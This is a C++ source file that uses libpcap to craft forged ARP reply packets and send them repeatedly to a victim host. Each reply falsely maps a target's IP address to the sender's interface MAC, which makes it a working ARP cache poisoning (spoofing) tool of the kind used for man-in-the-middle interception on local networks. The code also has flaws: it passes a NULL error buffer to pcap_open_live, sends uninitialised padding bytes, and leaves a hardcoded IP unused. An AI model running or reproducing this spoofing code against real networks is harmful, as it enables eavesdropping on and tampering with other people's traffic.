#include <iostream>
#include <string>
#include "node.h"
#include <pcap.h>
#include <stdlib.h>
#include <string.h>
using namespace std;

void send_arp(Node *sender, Node *target, int count){

        pcap_t *handle;
	char *errbuf = NULL;
        handle = pcap_open_live(sender->iface.c_str(), BUFSIZ, 0, 1000, errbuf);
        if (handle == NULL){
                cout << errbuf << endl;
                exit(0);
        }
        
	u_char packet[100];
        int i=0;
        u_char dest_mac[] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };     // Broad cast
        u_char sender_ip[] = { 0xd2, 0x5c, 0x8e, 0x01 };                // Myip
        u_char target_mac[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
        u_char ether_type[] = { 0x08, 0x06 };           //ARP
        u_char Hardware_Type[] = { 0x00,0x01 };         //ETHERNET
        u_char Protocol_Type[] = { 0x08,0x00 };         //IP
        u_char Hardware_Size[] = { 0x06 };
        u_char Protocol_Size[] = { 0x04 };
        u_char Opcode[] = { 0x00, 0x02 };                       //Reply

        memcpy(packet + i, sender->mac_addr, sizeof(sender->mac_addr));			//sender mac
        i += sizeof(sender->mac_addr);
        memcpy(packet + i, sender->iface_mac_addr, sizeof(sender->iface_mac_addr));     // src mac
        i += sizeof(sender->iface_mac_addr);
        memcpy(packet + i, ether_type, sizeof(ether_type));
        i += sizeof(ether_type);
        memcpy(packet + i, Hardware_Type, sizeof(Hardware_Type));
        i += sizeof(Hardware_Type);
        memcpy(packet + i, Protocol_Type, sizeof(Protocol_Type));
        i += sizeof(Protocol_Type);
        memcpy(packet + i, Hardware_Size, sizeof(Hardware_Size));
        i += sizeof(Hardware_Size);
        memcpy(packet + i, Protocol_Size, sizeof(Protocol_Size));
        i += sizeof(Protocol_Size);
        memcpy(packet + i, Opcode, sizeof(Opcode));
        i += sizeof(Opcode);
        memcpy(packet + i, sender->iface_mac_addr, sizeof(sender->iface_mac_addr));     // sender_mac
        i += sizeof(sender->iface_mac_addr);
        memcpy(packet + i, target->ip_addr, sizeof(target->ip_addr));
        i += sizeof(target->ip_addr);
        memcpy(packet + i, sender->mac_addr, sizeof(sender->mac_addr));             //traget mac
        i += sizeof(sender->mac_addr);
        memcpy(packet + i, sender->ip_addr, sizeof(sender->ip_addr));       //target ip
        i += sizeof(sender->ip_addr);
	
	for(int i=0; i<count; i++)
		pcap_sendpacket(handle, packet, 100);

	cout << endl << "[*] Send "<< count << " ARP reply packet to " << sender->ip_addr_str << endl;

}
